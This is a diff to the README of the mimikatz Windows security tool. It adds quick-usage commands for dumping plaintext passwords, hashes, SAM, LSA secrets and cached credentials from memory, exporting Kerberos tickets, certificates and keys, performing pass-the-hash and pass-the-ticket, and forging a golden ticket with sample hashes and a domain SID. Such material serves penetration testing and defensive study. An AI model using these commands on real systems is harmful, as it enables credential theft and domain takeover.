@@ -1,8 +1,8 @@
 # mimikatz
 
-`mimikatz` is a tool I've made to learn `C` and make somes experiments with Windows security.
+**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.
 
-It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. It also can perform pass-the-hash, pass-the-ticket or build _Golden tickets_.
+It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** also can perform pass-the-hash, pass-the-ticket or build _Golden tickets_.
 
 ```
   .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
@@ -42,16 +42,52 @@ If you don't want to build it, binaries are availables on http://blog.gentilkiwi
 
 
 ## Quick usage
+```
+log
+privilege::debug
+```
 
 ### sekurlsa
-todo
+```
+sekurlsa::logonpasswords
+sekurlsa::tickets /export
+
+sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+```
 
 ### kerberos
-todo
+```
+kerberos::list /export
+kerberos::ptt c:\chocolate.kirbi
+
+kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
+```
 
 ### crypto
-todo
+```
+crypto::capi
+crypto::cng
 
+crypto::certificates /export
+crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
+
+crypto::keys /export
+crypto::keys /machine /export
+```
+
+### vault && lsadump
+```
+vault::cred
+vault::list
+
+token::elevate
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+token::revert
+```
 
 ## Build
 `mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:
@@ -62,14 +98,14 @@ todo
 You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)
 
 ### Synchronize!
-* `GIT` URL is : `https://github.com/gentilkiwi/mimikatz.git`
-* `SVN` URL is : `https://github.com/gentilkiwi/mimikatz/trunk`
+* GIT URL is : `https://github.com/gentilkiwi/mimikatz.git`
+* SVN URL is : `https://github.com/gentilkiwi/mimikatz/trunk`
 
 ### Build the solution
 * After opening the solution, `Build` / `Build Solution` (you can change architecture)
 * `mimikatz` is now built and ready to be used! (`Win32` / `x64`)
 
-### `ddk2003`
+### ddk2003
 With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)
 
 For this optional platform, Windows Driver Kit **7.1** (WinDDK) - http://www.microsoft.com/download/details.aspx?id=11800 and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.
